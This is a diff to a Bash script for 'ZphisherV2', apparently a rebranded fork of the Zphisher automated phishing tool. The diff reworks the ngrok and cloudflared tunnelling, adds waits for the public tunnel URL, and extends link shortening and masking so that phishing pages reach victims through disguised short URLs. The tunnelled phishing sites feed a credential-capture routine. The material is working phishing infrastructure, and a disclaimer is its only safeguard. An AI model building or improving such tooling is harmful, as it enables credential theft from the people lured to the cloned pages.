@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   ZphisherV2 	: 	Automated Phishing Tool
+##   Author 	: 	Krrish 
+##   Version 	: 	2.4.0
+##   Based on 	: 	https://github.com/htr-tech/zphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -77,7 +77,12 @@
 ##    modification follow.
 ##
 ##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Modified by Krrish (2026) - ZphisherV2
 ##
+
+##   BASED ON :
+##   htr-tech/zphisher - https://github.com/htr-tech/zphisher
+##   ZphisherV2 by Krrish - improvements and bug fixes
 
 ##   THANKS TO :
 ##   1RaY-1 - https://github.com/1RaY-1
@@ -90,7 +95,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.5"
+__version__="2.4.0"
 
 ## Bash version check (read -i requires Bash 4+)
 if [[ ${BASH_VERSINFO[0]} -lt 4 ]]; then
@@ -202,23 +207,22 @@ check_update(){
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE}  ██████╗ ██╗███╗   ██╗███████╗███╗   ███╗██╗██╗   ██╗██╗  ██╗██╗   ██╗
+		${ORANGE}  ██╔══██╗██║████╗  ██║██╔════╝████╗ ████║██║██║   ██║╚██╗██╔╝╚██╗ ██╔╝
+		${ORANGE}  ██████╔╝██║██╔██╗ ██║███████╗██╔████╔██║██║██║   ██║ ╚███╔╝  ╚████╔╝ 
+		${ORANGE}  ██╔═══╝ ██║██║╚██╗██║╚════██║██║╚██╔╝██║██║╚██╗ ██╔╝ ██╔██╗   ╚██╔╝  
+		${ORANGE}  ██║     ██║██║ ╚████║███████║██║ ╚═╝ ██║██║ ╚████╔╝ ██╔╝ ██╗   ██║   
+		${ORANGE}  ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   
+		${ORANGE}                                              ${RED}v${__version__}${ORANGE} by Krrish
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Krrish (ZphisherV2)${WHITE}
 	EOF
 }
 
@@ -226,9 +230,13 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}  ██████╗ ██╗███╗   ██╗███████╗███╗   ███╗██╗██╗   ██╗██╗  ██╗██╗   ██╗
+		${BLUE}  ██╔══██╗██║████╗  ██║██╔════╝████╗ ████║██║██║   ██║╚██╗██╔╝╚██╗ ██╔╝
+		${BLUE}  ██████╔╝██║██╔██╗ ██║███████╗██╔████╔██║██║██║   ██║ ╚███╔╝  ╚████╔╝ 
+		${BLUE}  ██╔═══╝ ██║██║╚██╗██║╚════██║██║╚██╔╝██║██║╚██╗ ██╔╝ ██╔██╗   ╚██╔╝  
+		${BLUE}  ██║     ██║██║ ╚████║███████║██║ ╚═╝ ██║██║ ╚████╔╝ ██╔╝ ██╗   ██║   
+		${BLUE}  ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   
+		${BLUE}                                                              ${CYAN}v${__version__}${BLUE} by Krrish
 	EOF
 }
 
@@ -327,43 +335,48 @@ install_cloudflared() {
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		return
+	fi
+
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Ngrok..."${WHITE}
+	arch=`uname -m`
+	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		ngrok_arch="linux-arm"
+	elif [[ "$arch" == *'aarch64'* ]]; then
+		ngrok_arch="linux-arm64"
+	elif [[ "$arch" == *'x86_64'* ]]; then
+		ngrok_arch="linux-amd64"
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Ngrok..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			ngrok_arch="linux-arm"
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			ngrok_arch="linux-arm64"
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			ngrok_arch="linux-amd64"
-		else
-			ngrok_arch="linux-386"
-		fi
+		ngrok_arch="linux-386"
+	fi
 
-		# Try multiple download sources
-		download_success=false
-		urls=(
-			"https://bin.equinox.io/b/6panyg5ky5gf/ngrok-${ngrok_arch}"
-			"https://dl.equinox.io/ngrok/ngrok-v3-stable-linux-${ngrok_arch}.zip"
-		)
-
-		for url in "${urls[@]}"; do
-			echo -e "\n${CYAN}Trying: ${url}${WHITE}"
-			if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output .server/ngrok "$url" 2>/dev/null; then
-				if [[ -s ".server/ngrok" ]]; then
-					chmod +x .server/ngrok
-					download_success=true
-					break
-				fi
+	# Try downloading as zip (most common format)
+	zipfile=".server/ngrok.zip"
+	echo -e "\n${CYAN}Downloading Ngrok for ${ngrok_arch}...${WHITE}"
+	if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output "$zipfile" "https://bin.equinox.io/b/6panyg5ky5gf/ngrok-v3-stable-linux-${ngrok_arch}.zip" 2>/dev/null; then
+		if unzip -qq -o "$zipfile" -d .server/ > /dev/null 2>&1; then
+			if [[ -e ".server/ngrok" ]]; then
+				chmod +x .server/ngrok
+				rm -f "$zipfile"
+				return
 			fi
-		done
-
-		# If download failed, warn user
-		if [[ "$download_success" == "false" ]]; then
-			echo -e "\n${ORANGE}Warning: Ngrok download failed. Use Cloudflared instead (option 2).${WHITE}"
-			touch .server/ngrok.unavailable
 		fi
 	fi
+	rm -f "$zipfile"
+
+	# Try direct binary download
+	echo -e "${CYAN}Trying direct binary download...${WHITE}"
+	if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output .server/ngrok "https://bin.equinox.io/b/6panyg5ky5gf/ngrok-${ngrok_arch}" 2>/dev/null; then
+		if [[ -s ".server/ngrok" ]]; then
+			chmod +x .server/ngrok
+			return
+		fi
+	fi
+	rm -f .server/ngrok
+
+	# Download failed - mark as unavailable
+	echo -e "\n${ORANGE}Warning: Ngrok download failed. Use Cloudflared instead (option 2).${WHITE}"
+	touch .server/ngrok.unavailable
 }
 
 ## Exit message
@@ -377,9 +390,8 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}Krrish ${RED}[ ${ORANGE}ZphisherV2 ${RED}]
+		${GREEN} Based on ${RED}:  ${CYAN}https://github.com/htr-tech/zphisher
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -387,10 +399,9 @@ about() {
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
+		${WHITE} ${CYANBG}Credits:${RESETBG}
+		${GREEN}  Based on Zphisher by htr-tech
+		  Improvements & fixes by Krrish
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -486,30 +497,42 @@ capture_data() {
 }
 
 ## Start Cloudflared
-start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+start_cloudflared() {
+	rm -f .server/.cld.log > /dev/null 2>&1
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	sleep 8
-	cldflr_url=$(grep -oE 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' ".server/.cld.log" | head -1)
+	# Wait for URL to appear in log (up to 30 seconds)
+	cldflr_url=""
+	for i in {1..15}; do
+		sleep 2
+		cldflr_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' ".server/.cld.log" 2>/dev/null | head -1)
+		[[ -n "$cldflr_url" ]] && break
+	done
+
+	if [[ -z "$cldflr_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get Cloudflared URL. Check .server/.cld.log"
+		return 1
+	fi
+
 	custom_url "$cldflr_url"
 	capture_data
 }
 
 ## Start Ngrok
 start_ngrok() {
-	if [[ -e ".server/ngrok.unavailable" ]]; then
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ngrok is not installed. Please use Cloudflared instead."
-		sleep 2
+	if [[ ! -x ".server/ngrok" ]] || [[ -e ".server/ngrok.unavailable" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ngrok binary not found or not executable."
+		echo -e "${CYAN}Please download ngrok manually from ${GREEN}https://ngrok.com/download${CYAN} and place it at ${GREEN}.server/ngrok${CYAN} then run ${GREEN}chmod +x .server/ngrok${WHITE}"
+		sleep 3
 		tunnel_menu
 		return
 	fi
@@ -519,7 +542,7 @@ start_ngrok() {
 	{ sleep 1; setup_site; }
 	echo -e "\n"
 	echo -e "${RED}[${WHITE}!${RED}]${ORANGE} Ngrok now requires a free auth token.${WHITE}"
-	echo -e "${CYAN}Get your free token at: ${GREEN}https://ngrok.com${WHITE}"
+	echo -e "${CYAN}Get your free token at: ${GREEN}https://dashboard.ngrok.com/get-started/your-authtoken${WHITE}"
 	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your Ngrok Auth Token :${ORANGE} " NGROK_AUTHTOKEN
 	[[ -z "$NGROK_AUTHTOKEN" ]] && {
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ngrok Auth Token is required."
@@ -534,9 +557,20 @@ start_ngrok() {
 		sleep 1 && ./.server/ngrok http "$HOST":"$PORT" --log=stdout > .server/.ngrok.log 2>&1 &
 	fi
 
-	sleep 8
-	ngrok_url=$(cat .server/.ngrok.log | grep -oE 'https://[a-zA-Z0-9.-]*\.ngrok\.io' | head -1)
-	[[ -z "$ngrok_url" ]] && ngrok_url=$(cat .server/.ngrok.log | grep -oE 'http://[a-zA-Z0-9.-]*\.ngrok\.io' | head -1)
+	# Wait for URL to appear (up to 30 seconds)
+	ngrok_url=""
+	for i in {1..15}; do
+		sleep 2
+		ngrok_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.ngrok\.io' .server/.ngrok.log 2>/dev/null | head -1)
+		[[ -z "$ngrok_url" ]] && ngrok_url=$(grep -oE 'http://[a-zA-Z0-9.-]+\.ngrok\.io' .server/.ngrok.log 2>/dev/null | head -1)
+		[[ -n "$ngrok_url" ]] && break
+	done
+
+	if [[ -z "$ngrok_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get Ngrok URL. Check .server/.ngrok.log"
+		return 1
+	fi
+
 	custom_url "$ngrok_url"
 	capture_data
 }
@@ -605,16 +639,21 @@ shorten() {
 }
 
 custom_url() {
-	url=${1#http*//*}
+	url=${1#http*//}
+	url=${url%%/*}
 	isgd="https://is.gd/create.php?format=simple&url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*trycloudflare\.com ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
+	if [[ ${url} =~ trycloudflare\.com$ ]] || [[ ${url} =~ ngrok\.io$ ]]; then
+		# Try is.gd first, then tinyurl as fallback
+		if [[ $(site_stat "$isgd") == 2* ]]; then
+			shorten "$isgd" "$url"
+		elif [[ $(site_stat "$tinyurl") == 2* ]]; then
+			shorten "$tinyurl" "$url"
 		else
-			shorten $tinyurl "$url"
+			# Both shorteners unavailable, use original URL
+			processed_url="$url"
 		fi
 
 		# Strip protocol from mask for userinfo component
